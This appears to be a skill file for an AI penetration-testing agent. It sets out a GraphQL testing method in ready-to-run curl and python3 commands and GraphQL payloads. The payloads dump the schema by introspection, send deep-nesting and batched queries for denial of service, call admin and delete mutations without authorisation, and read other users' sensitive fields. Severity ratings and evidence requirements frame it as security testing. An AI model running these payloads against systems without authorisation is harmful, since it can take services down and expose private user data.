---
name: attack-graphql
description: Break a GraphQL endpoint on its own terms — extract the schema by introspection, abuse query batching and deep nesting for complexity denial of service, and reach queries and mutations the resolvers never authorise. Reach for it once /graphql or a sibling path answers a query.
metadata:
  acordia:
    family: web-attack
  cyberstrike:
    source: .cyberstrike/skill/attack-graphql/SKILL.md
    commit: 359655518
---

# GraphQL Vulnerability Testing

## Objective

Exploit GraphQL-specific vulnerabilities including schema exposure, query complexity abuse, and authorization bypass.

## Testing Methodology

### Phase 1: Automated Testing

```bash
# Full GraphQL test suite — introspection sweep via curl (or InQL/graphql-cop if
# installed; ask the user before installing either)
curl -s -X POST "https://TARGET/graphql" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name } } } mutationType { fields { name args { name type { name } } } } queryType { fields { name } } } }"}'

# Custom depth/batch — generate a deeply nested query with python3 (safe JSON
# quoting via the json module), then send it with curl
python3 -c "
import json
depth = 15
inner = '__typename'
for _ in range(depth):
    inner = f'field {{ {inner} }}'
print(json.dumps({'query': '{ ' + inner + ' }'}))
" > /tmp/deep_query.json
curl -s -X POST "https://TARGET/graphql" -H "Content-Type: application/json" -d @/tmp/deep_query.json

# Batch of 100 queries in a single request
python3 -c "
import json
print(json.dumps([{'query': '{ __typename }'} for _ in range(100)]))
" | curl -s -X POST "https://TARGET/graphql" -H "Content-Type: application/json" -d @-
```

### Phase 2: Introspection Query

```bash
# Full schema extraction
curl -s -X POST https://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name } } } mutationType { fields { name args { name type { name } } } } queryType { fields { name } } } }"}'

# Deeper extraction including type kinds and list/non-null wrappers, saved for analysis
curl -s -X POST https://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { name } mutationType { name } types { name kind fields { name args { name type { name } } type { name kind ofType { name } } } } } }"}' | jq . > schema.json

# Common endpoints, if /graphql returns 404
# /graphql, /graphiql, /v1/graphql, /api/graphql, /query
```

If introspection is enabled, map all types, queries, mutations, and subscriptions.

### Phase 3: Authorization Bypass

```graphql
# Access admin queries without auth
{ adminUsers { id email role } }

# Mutation without auth
mutation { deleteUser(id: "123") { success } }

# Access other user's data
{ user(id: "OTHER_USER_ID") { email ssn creditCard } }
```

### Phase 4: Complexity / DoS

```graphql
# Deeply nested query
{ users { posts { comments { author { posts { comments { author { id } } } } } } } }

# Alias multiplication
{ a1: __typename a2: __typename ... a100: __typename }

# Batch queries (array)
[{"query":"{ __typename }"}, {"query":"{ __typename }"}, ... x50]
```

### Phase 5: Directive Abuse

```graphql
# Skip/include directive for info leakage
{ user(id: "1") { name email @skip(if: false) secretField @include(if: true) } }

# Field suggestions (error-based enum)
{ user { nonExistentField } }
# Error may suggest: "Did you mean: password, secret_key?"
```

## What Constitutes a Finding

| Finding | Severity |
|---------|----------|
| Introspection enabled (schema exposed) | Medium (P3) |
| Admin mutations accessible without auth | Critical (P1) |
| Other user data accessible (IDOR) | High (P2) |
| DoS via complexity (server timeout/crash) | Medium (P3) |
| Batch queries bypass rate limiting | Medium (P3) |

## Evidence Requirements

- GraphQL endpoint URL
- Query/mutation sent
- Response showing unauthorized data
- For introspection: schema dump (types, mutations, queries)
- For DoS: response timing proving server overload

## Tools

- curl (introspection) plus python3 for generating nested/batched query bodies (see Phase 1), or `InQL`/`graphql-cop` if available — ask the user before installing — automated introspection + DoS + batch testing

## References

- [PortSwigger: GraphQL](https://portswigger.net/web-security/graphql)
- [HackerOne: GraphQL Bugs](https://www.hackerone.com/vulnerability-management/graphql-security-guide)
